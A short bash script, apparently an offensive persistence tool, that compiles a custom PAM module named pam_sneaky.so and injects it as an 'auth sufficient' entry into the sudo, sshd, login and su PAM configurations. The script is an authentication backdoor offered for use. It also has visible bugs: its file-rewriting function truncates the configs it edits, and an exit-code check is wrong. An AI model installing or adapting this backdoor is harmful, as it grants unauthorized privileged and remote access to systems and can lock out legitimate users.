#!/bin/bash

# Verify you are running as root
if [ $UID -ne 0 ]; then
    echo "[X] Not running as root. Won't be able to make changes."
    exit
fi

PAM_OBJECT="pam_sneaky.so"
PAM_SOURCE="pam_sneaky.c"
MODULE_DIR="/usr/lib/security/"
PAM_CONFIG_DIR="/etc/pam.d/"
PAM_BUG_FILES=(
    "sudo"
    "sshd"
    "login"
    "su"
)


# Build the program
echo "[+] Building ${PAM_OBJECT}"
gcc -shared -o ${PAM_OBJECT} ${PAM_SOURCE}

# Ensure it was successfully built. Retry after installing dependencies
if [ $? -ne 0 ]; then

    if [ $? -eq 127 ]; then
        echo "[X] gcc not installed, failing..."
        exit
    fi

    echo "[!] Failed building ${PAM_OBJECT}, installing dependencies"

    uname -a | grep -i "(Debian|Ubuntu)"
    if [ $? -eq 0 ]; then
        echo "[+] Installing libpam0g-dev with apt-get"
        apt-get install libpam0g-dev
    else
        echo "[+] Installing pam-devel with yum"
        yum install pam-devel
    fi
    echo "[+] Rebuilding ${PAM_OBJECT}"
    gcc -shared -o ${PAM_OBJECT} ${PAM_SOURCE}
fi


# Verify the file exists
if [ ! -e ${PAM_OBJECT} ]; then
    echo "[X] ${PAM_OBJECT} not found, failing..."
    exit
fi

# Make the directory to store the object file in
mkdir -p ${MODULE_DIR}
cp ${PAM_OBJECT} ${MODULE_DIR}


function bug_file(){
    (echo "auth    sufficient    ${MODULE_DIR}${PAM_OBJECT}"; sed '/.*'${PAM_OBJECT}'.*/d' $1) > $1
}


# Bug all the files to use pam_sneaky
for PAM_FILE in ${PAM_BUG_FILES[@]}; do
  bug_file ${PAM_CONFIG_DIR}${PAM_FILE}
done
